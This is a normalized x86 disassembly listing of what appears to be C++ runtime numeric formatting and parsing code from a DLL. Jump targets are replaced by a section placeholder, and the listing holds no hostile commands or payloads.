lea ecx [ ebp - 0x48 ]
call sub_10007b0c
cmp [ eax ] 0x0
jle r-xdata
mov ecx esi
call sub_10040010
cmp ax di
jne r-xdata
mov ecx esi
call sub_10040010
cmp ax [ ebp - 0x54 ]
jne r-xdata
inc [ ebp - 0x60 ]
jmp r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1003fdb2
mov ecx esi
call sub_10040010
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebx ] 0x0
call sub_10002020
mov eax [ ebp - 0x60 ]
call sub_100282ef
retn
mov [ ebx ] 0x65
mov ecx esi
inc ebx
call sub_1003fdb2
push [ ebp - 0x58 ]
and [ ebp - 0x50 ] 0x0
mov ecx esi
mov [ ebp - 0x49 ] 0x0
call sub_1003fe92
test al al
jne r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x45
call sub_1003e793
add esp 0xc
mov ecx esi
mov di ax
call sub_10040010
cmp ax di
jne r-xdata
dec [ ebp - 0x5c ]
je r-xdata
mov [ ebp - 0x4a ] 0x1
inc [ ebp - 0x5c ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10007a24
inc [ ebp - 0x5c ]
mov ecx esi
call sub_10040010
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
je r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10007b0c
cmp [ eax ] 0x7f
je r-xdata
push [ ebp - 0x58 ]
push esi
call sub_10040264
pop ecx
pop ecx
test al al
je r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x2b
call sub_1003e793
add esp 0xc
mov ecx esi
mov di ax
call sub_10040010
cmp ax di
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
jne r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10007b0c
mov cl [ edi ]
cmp cl [ eax ]
jne r-xdata
mov ecx esi
call sub_1003fdb2
push [ ebp - 0x58 ]
push esi
call sub_10040264
pop ecx
pop ecx
test al al
jne r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10007b0c
inc [ eax ]
jmp r-xdata
push [ ebp - 0x58 ]
push esi
call sub_10040264
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx esi
call sub_10040010
cmp ax [ ebp - 0x54 ]
jne r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x2d
call sub_1003e793
add esp 0xc
mov ecx esi
mov di ax
call sub_10040010
cmp ax di
jne r-xdata
mov [ ebx ] 0x2b
jmp r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10007b0c
mov cl [ edi ]
cmp cl [ eax ]
jl r-xdata
mov [ ebp - 0x4a ] 0x1
mov ecx esi
call sub_10040010
cmp [ ebp - 0x54 ] ax
ja r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1003fdb2
push [ ebp - 0x58 ]
push esi
call sub_10040264
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebx ] 0x2d
mov ecx esi
inc ebx
call sub_1003fdb2
mov edi eax
jmp r-xdata
mov ecx esi
call sub_10040010
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov [ ebx ] 0x30
inc ebx
jmp r-xdata
cmp [ ebp - 0x50 ] 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1003fdb2
mov ecx esi
call sub_10040010
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
sub_10043f6e
push 0x6c
mov eax sub_1004c28a
call sub_1002826c
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x74 ] eax
lea eax [ ebp - 0x78 ]
push eax
mov [ ebp - 0x60 ] ecx
call sub_10003446
and [ ebp - 0x4 ] 0x0
push eax
call sub_10042133
or [ ebp - 0x4 ] 0xffffffff
pop ecx
mov ebx eax
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x64 ] ebx
call sub_10003c49
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_10040467
mov eax [ ebx ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x1
call [ eax + 0x8 ]
movzx eax ax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x6c ] eax
call sub_10003d21
lea eax [ edi + 0x8 ]
push eax
xor ebx ebx
push ebx
push 0x30
mov [ ebp - 0x4 ] 0x2
call sub_1003e793
movzx eax ax
mov [ ebp - 0x54 ] eax
mov al [ esi ]
add esp 0xc
cmp al 0x2b
je r-xdata
mov [ ebp - 0x70 ] 0x1
mov [ ebp - 0x70 ] ebx
cmp al 0x2d
jne r-xdata
cmp [ ebp - 0x30 ] 0x10
mov eax [ ebp - 0x44 ]
jae r-xdata
mov [ ebp + 0x2c ] ebx
call sub_10024c18
mov eax [ eax ]
push [ ebp + 0x30 ]
mov al [ eax ]
push 0x65
push esi
mov [ ebp - 0x50 ] al
mov [ ebp - 0x4f ] 0x65
mov [ ebp - 0x4e ] bl
call sub_10024c40
push [ ebp + 0x30 ]
mov [ ebp - 0x58 ] eax
movsx eax [ ebp - 0x50 ]
push eax
push esi
call sub_10024c40
add esp 0x18
mov [ ebp - 0x4c ] eax
cmp eax ebx
jne r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x44 ]
mov ecx [ ebp + 0x28 ]
mov eax [ ebp + 0x24 ]
mov edx [ ebp - 0x60 ]
add eax ecx
add eax [ ebp + 0x2c ]
mov ecx [ edx + 0x18 ]
add eax [ ebp + 0x30 ]
cmp ecx ebx
jle r-xdata
cmp [ ebp - 0x30 ] 0x10
mov eax [ ebp - 0x44 ]
jae r-xdata
mov [ ebp - 0x4c ] ebx
cmp ecx eax
jbe r-xdata
cmp [ eax ] bl
jle r-xdata
lea eax [ ebp - 0x44 ]
movsx eax [ ebp - 0x50 ]
push [ ebp + 0x30 ]
push eax
push esi
call sub_10024c40
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax 0x100
jne r-xdata
sub ecx eax
mov [ ebp - 0x4c ] ecx
jmp r-xdata
push [ ebp + 0x30 ]
lea ecx [ ebp - 0x2c ]
push esi
call sub_10008756
mov eax [ ebp - 0x58 ]
cmp eax ebx
jne r-xdata
push [ ebp + 0x30 ]
push 0x65
push esi
call sub_10024c40
add esp 0xc
cmp eax ebx
je r-xdata
push [ ebp - 0x6c ]
sub eax esi
inc eax
mov ebx eax
lea eax [ ebx - 0x1 ]
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x5c ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1003fae1
mov ecx [ eax ]
push [ ebp + 0x24 ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x54 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x5c ]
push eax
push edi
call sub_1003f6d9
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x64 ]
mov [ ebp + 0x14 ] eax
mov eax [ ecx ]
add esp 0x34
call [ eax + 0x4 ]
movzx eax ax
push 0x1
push eax
push [ ebp + 0x14 ]
lea eax [ ebp - 0x68 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1003f6d9
mov ecx [ eax ]
push [ ebp + 0x28 ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x54 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x68 ]
push eax
push edi
call sub_1003f6d9
mov ecx [ eax ]
sub [ ebp + 0x30 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x30
add esi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
push [ ebp - 0x4c ]
lea eax [ ebp - 0x5c ]
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1003f6d9
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4c ] ebx
mov [ ebp + 0x14 ] eax
add esp 0x18
cmp [ ebp - 0x70 ] ebx
jbe r-xdata
mov eax [ edx + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
cmp [ ebp - 0x4c ] ebx
jne r-xdata
push 0x30
push [ ebp + 0x2c ]
lea ecx [ ebp - 0x2c ]
call sub_10007a24
jmp r-xdata
push [ ebp - 0x6c ]
lea eax [ ebp - 0x68 ]
push [ ebp + 0x30 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1003fae1
mov ecx [ eax ]
push [ ebp + 0x2c ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x54 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x5c ]
push eax
push edi
call sub_1003f6d9
mov ecx [ eax ]
push [ ebp - 0x4c ]
mov edx [ ebp - 0x60 ]
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x74 ]
mov [ ebp + 0x14 ] eax
push edi
mov [ edx + 0x18 ] ebx
call sub_1003f6d9
add esp 0x4c
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10002020
mov eax [ ebp - 0x74 ]
call sub_100282ef
retn
push [ ebp - 0x6c ]
sub eax esi
inc eax
mov ebx eax
lea eax [ ebx - 0x1 ]
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x68 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1003fae1
mov ecx [ eax ]
push [ ebp + 0x2c ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x54 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x68 ]
push eax
push edi
call sub_1003f6d9
mov ecx [ eax ]
and [ ebp + 0x2c ] 0x0
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
mov ecx [ ebp - 0x60 ]
add esp 0x34
test [ ecx + 0x10 ] 0x4
mov ecx r--data
jne r-xdata
push 0x1
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x5c ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1003fa94
mov ecx [ eax ]
add esp 0x18
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
inc esi
dec [ ebp + 0x30 ]
mov [ ebp + 0x14 ] eax
push 0x30
push [ ebp + 0x2c ]
sub eax esi
push eax
lea ecx [ ebp - 0x2c ]
call sub_10007a72
push 0x30
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x2c ]
call sub_10007a24
mov eax [ ebp - 0x58 ]
mov [ ebp + 0x24 ] ebx
push 0x30
lea ecx [ ebp - 0x2c ]
cmp [ ebp - 0x4c ] ebx
jne r-xdata
push 0x1
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x68 ]
push eax
push edi
call sub_1003fa94
mov ecx [ eax ]
sub [ ebp + 0x30 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
add esi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
mov ecx r--data
mov ebx [ ebp - 0x4c ]
push [ ebp + 0x28 ]
sub ebx esi
lea eax [ ebx + 0x1 ]
push eax
call sub_10007a72
push 0x30
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x2c ]
push ebx
call sub_10007a72
and [ ebp + 0x28 ] 0x0
xor ebx ebx
push [ ebp + 0x24 ]
call sub_10007a24
jmp r-xdata
lea eax [ ebp - 0x50 ]
push eax
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
push eax
call sub_10024cf0
pop ecx
pop ecx
mov [ ebp - 0x4c ] eax
jmp r-xdata
lea esi [ ebp - 0x44 ]
cmp [ ebp - 0x30 ] 0x10
mov esi [ ebp - 0x44 ]
mov [ ebp + 0x24 ] ebx
jae r-xdata
mov al [ esi ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
mov esi eax
mov eax [ ebp - 0x18 ]
mov [ ebp + 0x2c ] ebx
mov [ ebp + 0x30 ] eax
mov ecx [ ebp - 0x4c ]
sub ecx [ ebp - 0x70 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub [ ebp - 0x4c ] eax
push ebx
push 0x1
push [ ebp - 0x4c ]
lea ecx [ ebp - 0x2c ]
call sub_10007a72
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov esi eax
sub_100443ba
push 0x44
mov eax sub_1004c2bf
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x18 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4c ] eax
lea eax [ ebp - 0x50 ]
push eax
mov ecx ebx
mov [ ebp - 0x40 ] ebx
call sub_10003446
and [ ebp - 0x4 ] 0x0
push eax
call sub_10042133
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x48 ] eax
call sub_10003c49
mov ecx [ ebp - 0x48 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10040467
mov al [ esi ]
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
cmp al 0x2b
je r-xdata
mov [ ebp - 0x38 ] ecx
cmp al 0x2d
je r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
cmp al 0x30
jne r-xdata
mov edi [ ebx + 0x18 ]
test edi edi
jle r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax ecx
jae r-xdata
and [ ebp - 0x38 ] 0x0
jmp r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
xor edi edi
cmp edi [ ebp + 0x24 ]
jbe r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
cmp [ ebp - 0x14 ] 0x10
mov ecx [ ebp - 0x28 ]
mov eax ecx
jae r-xdata
mov [ ebp - 0x38 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ ebp - 0x48 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
push eax
push [ ebp + 0x24 ]
lea eax [ ebp - 0x3c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x34 ]
call sub_1003fae1
mov ecx [ eax ]
push edi
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
and [ ebx + 0x18 ] 0x0
push eax
push ecx
push [ ebp - 0x4c ]
mov [ ebp + 0x14 ] eax
push [ ebp - 0x34 ]
call sub_1003f6d9
add esp 0x34
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
mov eax [ ebp - 0x4c ]
call sub_100282ef
retn
cmp eax 0x100
lea eax [ ebp - 0x44 ]
je r-xdata
sub edi [ ebp + 0x24 ]
jmp r-xdata
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
push [ ebp - 0x38 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x34 ]
call sub_1003fa94
mov ecx [ eax ]
push edi
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
mov ecx [ ebp - 0x38 ]
push [ eax ]
sub [ ebp + 0x24 ] ecx
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
add esi ecx
call sub_1003f6d9
add esp 0x30
push edi
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x34 ]
call sub_1003f6d9
add esp 0x18
jmp r-xdata
mov eax [ ebx + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x30 ] ecx
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
xor edi edi
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x30 ]
mov al [ eax ]
cmp al 0x7f
jne r-xdata
mov edi [ ebp + 0x24 ]
jmp r-xdata
test al al
jle r-xdata
mov ecx edi
sub ecx [ ebp - 0x38 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub edi eax
mov eax [ ebp + 0x24 ]
sub eax edi
inc eax
push eax
lea ebx [ esi + edi ]
push ebx
push eax
lea eax [ esi + edi + 0x1 ]
push eax
call sub_100245ce
mov eax [ ebp - 0x30 ]
add esp 0x10
inc [ ebp + 0x24 ]
inc eax
mov [ ebx ] 0x0
cmp [ eax ] 0x0
jle r-xdata
mov ebx [ ebp - 0x40 ]
mov [ ebp - 0x30 ] eax
sub_100445a6
push 0x16c
mov eax sub_1004c3c4
call sub_1002826c
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x18 ]
mov esi [ ebp + 0x8 ]
and [ ebp - 0x70 ] 0x0
cmp [ ebp + 0x14 ] 0x0
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xa4 ] ecx
mov [ ebp - 0x7c ] esi
mov [ ebp - 0x74 ] eax
mov [ ebp - 0xa8 ] edi
mov ecx edi
je r-xdata
lea eax [ ebp - 0xac ]
push eax
call sub_10003446
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10042444
pop ecx
mov ebx eax
mov [ ebp - 0xa0 ] eax
lea ecx [ ebp - 0xac ]
lea eax [ ebp - 0xb0 ]
push eax
call sub_10003446
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100424e1
mov ebx eax
pop ecx
mov [ ebp - 0xa0 ] ebx
lea ecx [ ebp - 0xb0 ]
jmp r-xdata
mov ecx [ ebp - 0x90 ]
cmp ecx 0x4
jae r-xdata
call sub_10003c49
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x65 ] 0x0
mov [ ebp - 0x75 ] 0x0
call sub_100403af
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_100403af
mov eax [ ebx ]
lea ecx [ ebp - 0xb4 ]
push ecx
mov ecx ebx
mov [ ebp - 0x70 ] 0x1
call [ eax + 0x24 ]
and [ ebp - 0x90 ] 0x0
jmp r-xdata
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
movsx eax [ ebp + ecx - 0xb4 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x7c ]
push 0xffffffff
push 0x0
call sub_10040026
jmp r-xdata
cmp [ ebp - 0x34 ] 0x1
jbe r-xdata
cmp ecx 0x3
je r-xdata
sub eax 0x4
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100400d2
mov eax [ ebp - 0x7c ]
call sub_100282ef
retn 0x14
cmp [ ebp - 0x75 ] 0x0
je r-xdata
and [ ebp - 0x8c ] 0x0
and [ ebp - 0x88 ] 0x0
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_1003ff81
mov ecx [ eax ]
mov [ ebp - 0x8c ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x88 ] eax
jmp r-xdata
inc [ ebp - 0x90 ]
cmp [ ebp - 0x65 ] 0x0
je r-xdata
lea eax [ ebp - 0x88 ]
push eax
mov ecx edi
call sub_10003446
push eax
mov [ ebp - 0x4 ] 0xd
call sub_10041b11
pop ecx
lea ecx [ ebp - 0x88 ]
mov esi eax
mov [ ebp - 0x4 ] 0x3
call sub_10003c49
mov edi [ ebp - 0x6c ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_100403d0
test [ edi + 0x10 ] 0x8
mov [ ebp - 0x4 ] 0x4
jne r-xdata
sub eax 0x7
je r-xdata
mov eax [ ebp - 0xa4 ]
add eax 0x8
push eax
push 0x0
push 0x2d
call sub_1003e793
mov ecx [ ebp - 0x7c ]
add esp 0xc
movzx eax ax
push eax
push 0x1
push 0x0
call sub_100407a3
lea eax [ ebp - 0x98 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_100400a8
push eax
lea ecx [ ebp - 0x8c ]
call sub_1003f40c
mov ecx eax
call sub_1003fe0b
test al al
jne r-xdata
mov ebx [ ebp - 0xa0 ]
mov edi [ ebp - 0xa8 ]
push [ ebp - 0x74 ]
push edi
call sub_10040264
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp - 0x90 ] 0x3
jne r-xdata
cmp [ ebp - 0x14 ] 0x8
mov esi [ ebp - 0x28 ]
jae r-xdata
push [ ebp - 0x74 ]
mov ecx [ ebp - 0x6c ]
call sub_1003fe92
test al al
jne r-xdata
sub eax 0x4b
je r-xdata
push [ ebp - 0x74 ]
push [ ebp - 0x6c ]
call sub_10040264
pop ecx
pop ecx
test al al
je r-xdata
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_100400a8
push eax
lea ecx [ ebp - 0x8c ]
call sub_1003fe0b
test al al
je r-xdata
mov ecx edi
call sub_10040010
mov edx [ esi ]
movzx eax ax
push eax
push 0x48
mov ecx esi
call [ edx + 0x8 ]
test al al
je r-xdata
lea eax [ ebp - 0xd0 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_1003ff81
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x98 ] ecx
mov [ ebp - 0x94 ] eax
jmp r-xdata
cmp [ ebp - 0x34 ] 0x1
ja r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10040010
cmp ax [ esi ]
jne r-xdata
lea esi [ ebp - 0x28 ]
lea eax [ ebp - 0x124 ]
push eax
mov ecx ebx
call sub_100403e9
or [ ebp - 0x70 ] 0x2
cmp [ eax + 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x5
jbe r-xdata
mov eax [ ebx ]
xor esi esi
mov ecx ebx
mov [ ebp - 0x84 ] esi
call [ eax + 0x1c ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp - 0xa4 ]
add eax 0x8
push eax
push esi
push 0x30
call sub_1003e793
movzx eax ax
mov [ ebp - 0x80 ] eax
add esp 0xc
lea eax [ ebp - 0x64 ]
push eax
mov ecx ebx
call sub_10040467
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x50 ] esi
je r-xdata
dec eax
dec eax
jne r-xdata
lea ecx [ ebp - 0x8c ]
call sub_1003f2c3
mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_10040010
cmp ax [ esi ]
jne r-xdata
mov ecx edi
call sub_1003fdb2
push [ ebp - 0x74 ]
push [ ebp - 0x6c ]
call sub_10040264
pop ecx
pop ecx
test al al
jne r-xdata
push [ ebp - 0x74 ]
mov ecx [ ebp - 0x6c ]
call sub_1003fe92
test al al
jne r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_10040026
mov [ ebp - 0x76 ] 0x0
lea eax [ ebp - 0xec ]
push eax
mov ecx ebx
call sub_100403e9
or [ ebp - 0x70 ] 0x4
push 0x0
mov ecx eax
mov [ ebp - 0x4 ] 0x6
call sub_1003f83c
mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_10040010
mov [ ebp - 0x76 ] 0x1
cmp [ esi ] ax
je r-xdata
push [ ebp - 0x74 ]
push [ ebp - 0x6c ]
call sub_10040264
pop ecx
pop ecx
test al al
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx eax ax
mov [ ebp - 0xb8 ] eax
cmp ax si
je r-xdata
mov ecx [ ebp - 0x6c ]
call sub_1003fdb2
lea eax [ ebp - 0xc8 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_100400a8
push eax
lea ecx [ ebp - 0x98 ]
call sub_1003fe0b
test al al
je r-xdata
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_100400a8
push eax
lea ecx [ ebp - 0x98 ]
call sub_1003fe0b
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x8
mov esi [ ebp - 0x28 ]
jae r-xdata
test [ ebp - 0x70 ] 0x2
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x70 ] 0xfffffffb
push esi
push 0x1
lea ecx [ ebp - 0xec ]
call sub_100400d2
xor esi esi
test [ ebp - 0x70 ] 0x4
je r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10040010
cmp [ ebp - 0x80 ] ax
ja r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x4 ]
push [ ebp - 0x74 ]
mov edi [ ebp - 0x6c ]
push edi
movzx esi ax
call sub_10040264
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x4c ] 0x10
mov eax [ ebp - 0x60 ]
jae r-xdata
lea ecx [ ebp - 0x98 ]
call sub_1003f2c3
mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_10040010
cmp ax [ esi ]
jne r-xdata
push 0x0
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x65 ] 0x1
mov ecx [ ebp - 0x6c ]
call sub_10040010
cmp ax [ esi ]
je r-xdata
lea esi [ ebp - 0x28 ]
cmp [ ebp - 0x76 ] 0x0
je r-xdata
and [ ebp - 0x70 ] 0xfffffffd
push esi
push 0x1
lea ecx [ ebp - 0x124 ]
call sub_100400d2
mov ecx [ ebp - 0x6c ]
call sub_10040010
movzx ecx [ ebp - 0x80 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov edi [ ebp - 0x7c ]
cmp [ edi + 0x14 ] 0x0
jne r-xdata
test si si
je r-xdata
cmp [ eax ] 0x7f
jae r-xdata
lea eax [ ebp - 0x60 ]
lea ecx [ ebp - 0x98 ]
call sub_1003f40c
mov ecx [ ebp - 0x6c ]
call sub_1003fdb2
lea eax [ ebp - 0x140 ]
push eax
mov ecx ebx
call sub_10040480
or [ ebp - 0x70 ] 0x8
mov [ ebp - 0x4 ] 0x8
cmp [ eax + 0x14 ] esi
jbe r-xdata
mov ecx [ ebp - 0x6c ]
call sub_1003fdb2
lea eax [ ebp - 0x15c ]
push eax
mov ecx ebx
call sub_100403e9
push 0xffffffff
push esi
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x7
call sub_10040636
push esi
lea ecx [ ebp - 0x15c ]
jmp r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10040010
mov ecx [ ebp - 0x7c ]
movzx eax ax
push eax
push 0x1
call sub_10040544
mov ecx [ ebp - 0x6c ]
call sub_1003fdb2
mov esi [ ebp - 0x9c ]
cmp [ ebp - 0x84 ] esi
jge r-xdata
mov [ ebp - 0x65 ] 0x1
jmp r-xdata
mov ecx edi
call sub_10040010
cmp ax si
jne r-xdata
xor edi edi
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100079fe
push [ ebp - 0x74 ]
mov esi [ ebp - 0x6c ]
push esi
mov [ ebp - 0x4 ] 0xc
call sub_10040264
pop ecx
pop ecx
test al al
je r-xdata
xor bl bl
lea eax [ ebp - 0x108 ]
push eax
mov ecx ebx
call sub_10040480
or [ ebp - 0x70 ] 0x10
push esi
mov ecx eax
mov [ ebp - 0x4 ] 0x9
call sub_1003f83c
mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_10040010
cmp [ esi ] ax
jne r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x3
call sub_100400d2
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x3
call sub_10002020
jmp r-xdata
sub esi [ ebp - 0x84 ]
jmp r-xdata
cmp [ ebp - 0x4c ] 0x10
mov esi [ ebp - 0x60 ]
jae r-xdata
mov ecx esi
call sub_10040010
cmp [ ebp - 0x80 ] ax
ja r-xdata
test [ ebp - 0x70 ] 0x8
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x70 ] 0xffffffef
push 0x0
push 0x1
lea ecx [ ebp - 0x108 ]
call sub_100400d2
mov bl 0x1
jmp r-xdata
push [ ebp - 0x80 ]
mov ecx edi
push 0x1
call sub_10040544
dec esi
jne r-xdata
jmp r-xdata
mov ecx edi
call sub_1003fdb2
push [ ebp - 0x74 ]
push edi
call sub_10040264
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
lea esi [ ebp - 0x60 ]
push edi
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
cmp [ eax ] 0x0
je r-xdata
mov ecx esi
call sub_10040010
movzx ecx [ ebp - 0x80 ]
movzx eax ax
